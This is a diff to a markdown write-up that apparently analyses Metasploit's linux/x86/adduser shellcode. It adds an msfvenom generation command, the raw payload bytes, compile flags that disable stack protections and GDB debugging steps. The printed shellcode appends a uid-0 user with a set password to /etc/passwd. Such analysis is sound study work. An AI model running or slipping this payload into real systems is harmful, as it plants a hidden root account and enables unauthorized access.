@@ -53,8 +53,17 @@ When the PNG picture is generated it is empty.
 With ndisasm it is possible to get the .nasm code using:
 
 ```
+msfvenom -p linux/x86/adduser --platform=Linux -a x86 -f raw USER=ricardo PASS=sectube SHELL=/bin/bash | ndisasm -u -
+```
+
+
+Or a little quicker:
+
+```
 echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x27\x00\x00\x00\x72\x69\x63\x61\x72\x64\x6f\x3a\x41\x7a\x76\x44\x72\x2e\x72\x57\x33\x54\x34\x69\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
 ```
+
+
 
 ![Screenshot](../images/adduser/5.png)
 
@@ -129,11 +138,24 @@ The values used in the second syscall are '/etc//passwd', while the value in the
 
 Next, the executable gets generated using the *shellcode.c* script:
 
+![Screenshot](../images/adduser/15.png)
+
+It is compiled:
+
 ```
 gcc -fno-stack-protector -z execstack shellcode.c -o 1
 ```
 
 An executable named "1" gets generated. It is possible to execute it and check the "/etc/passwd" file to check if the user has been correctly generated.
+
+![Screenshot](../images/adduser/16.png)
+
+In this case, it was executed twice so there are two lines at the bottom of the file.
+
+
+Also note that if we study the binary there are interesting strings we can find (this one will appear again later):
+
+![Screenshot](../images/adduser/17.png)
 
 
 ### Study with GDB
@@ -143,3 +165,18 @@ First, the executable is attached in quiet mode:
 ```
 gdb -q 1
 ```
+Then, we set the disassembly flavor and jump into the "main" function (the one from shellcode.c):
+
+![Screenshot](../images/adduser/18.png)
+
+Now, we must jump to the shellcode, so we set a breakpoint in the last 'call eax' instruction visible in the previous screenshot (the previous call instructions show the length of the shellcode).
+
+We continue for one instruction using 'stepi' and the 'disassemble' command shows we have reached the shellcode:
+
+![Screenshot](../images/adduser/19.png)
+
+Now, all the shellcode with the four syscalls can be read:
+
+![Screenshot](../images/adduser/20.png)
+
+
